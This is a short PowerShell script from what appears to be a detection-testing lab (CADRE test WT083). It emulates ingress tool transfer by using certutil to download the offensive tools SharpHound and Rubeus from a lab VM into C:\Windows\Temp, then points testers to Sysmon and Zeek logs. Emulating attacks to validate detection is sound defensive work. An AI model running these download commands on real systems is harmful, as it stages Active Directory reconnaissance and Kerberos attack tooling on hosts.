# CADRE — WT083 — Ingress Tool Transfer
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT083 - Ingress Tool Transfer"
start_attack "083" "Ingress Tool Transfer"
step "Download SharpHound from provisioning VM"
run_cmd "certutil -urlcache -split -f http://192.168.77.60:8081/SharpHound.exe C:\Windows\Temp\SharpHound.exe"
step "Download Rubeus from provisioning VM"
run_cmd "certutil -urlcache -split -f http://192.168.77.60:8081/Rubeus.exe C:\Windows\Temp\Rubeus.exe"
step "Verify downloads"
run_cmd "Get-ChildItem C:\Windows\Temp\SharpHound.exe, C:\Windows\Temp\Rubeus.exe"
result 0 "WT083 completed — check Sysmon EID 3 and Zeek conn.log"
